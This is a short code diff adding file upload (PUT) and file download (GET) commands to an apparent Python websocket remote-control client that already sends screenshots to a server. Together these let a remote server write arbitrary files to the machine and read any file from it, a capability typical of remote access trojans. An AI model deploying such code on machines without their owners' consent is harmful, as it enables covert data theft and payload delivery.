@@ -38,6 +38,33 @@ async def main():
                 im = pyscreenshot.grab()
                 #im.show()
                 await websocket.send("RECEIVER_OUTPUT|" + im_2_b64(im).decode("utf-8"))
+                
+            if(server.startswith("PUT|")):
+                try:
+                    split = server.split("|")
+
+                    filename = split[1]
+                    data = split[2]
+
+                    f = open(filename, 'wb')
+                    f.write(base64.b64decode(data.encode("utf-8")))
+                    f.close()
+
+                    await websocket.send("RECEIVER_OUTPUT|DONE")
+                except:
+                    await websocket.send("RECEIVER_OUTPUT|ERROR")
+
+            if(server.startswith("GET|")):
+                try:
+                    split = server.split("|")
+
+                    source = split[1]
+
+                    f = open(source, "rb")
+                    data = base64.b64encode(f.read()).decode("utf-8")
+                    await websocket.send("RECEIVER_OUTPUT|" + data)
+                except:
+                    print("fail")
 
 
             print("writing : " + server)
